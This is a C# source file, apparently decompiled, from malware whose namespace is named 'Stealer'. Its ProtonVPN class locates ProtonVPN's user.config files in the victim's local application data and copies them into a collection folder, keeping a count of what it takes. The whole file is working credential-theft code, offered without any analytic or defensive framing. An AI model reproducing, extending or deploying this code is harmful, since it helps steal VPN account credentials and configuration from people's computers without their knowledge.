using System;
using System.IO;

namespace Stealer
{
	// Token: 0x02000023 RID: 35
	internal sealed class ProtonVPN
	{
		// Token: 0x060000AC RID: 172 RVA: 0x00006508 File Offset: 0x00004708
		public static void Save(string sSavePath)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
			if (!Directory.Exists(path))
			{
				return;
			}
			try
			{
				foreach (string text in Directory.GetDirectories(path))
				{
					if (text.Contains("ProtonVPN.exe"))
					{
						string[] directories2 = Directory.GetDirectories(text);
						for (int j = 0; j < directories2.Length; j++)
						{
							string text2 = directories2[j] + "\\user.config";
							string text3 = Path.Combine(sSavePath, new DirectoryInfo(Path.GetDirectoryName(text2)).Name);
							if (!Directory.Exists(text3))
							{
								Counter.VPN++;
								Directory.CreateDirectory(text3);
								File.Copy(text2, text3 + "\\user.config");
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
